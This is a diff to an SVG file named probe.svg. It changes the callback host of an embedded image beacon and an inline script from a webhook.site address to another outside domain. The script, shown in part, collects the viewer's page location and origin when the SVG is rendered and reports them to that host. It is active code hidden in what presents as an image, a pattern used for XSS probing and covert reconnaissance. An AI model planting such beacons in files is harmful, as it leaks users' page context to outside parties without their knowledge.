@@ -5,11 +5,11 @@
   <text x="50%" y="50%" fill="#fff" font-size="20" text-anchor="middle">probe.svg</text>
 
   <image width="1" height="1"
-         href="https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-svg-image-load"/>
+         href="https://screenshotsart.store/dcl/probe-svg-image-load"/>
 
   <script type="application/ecmascript"><![CDATA[
     (function () {
-      var b = "https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-svg-script-fired";
+      var b = "https://screenshotsart.store/dcl/probe-svg-script-fired";
       var ctx = {
         href: location.href,
         origin: location.origin,
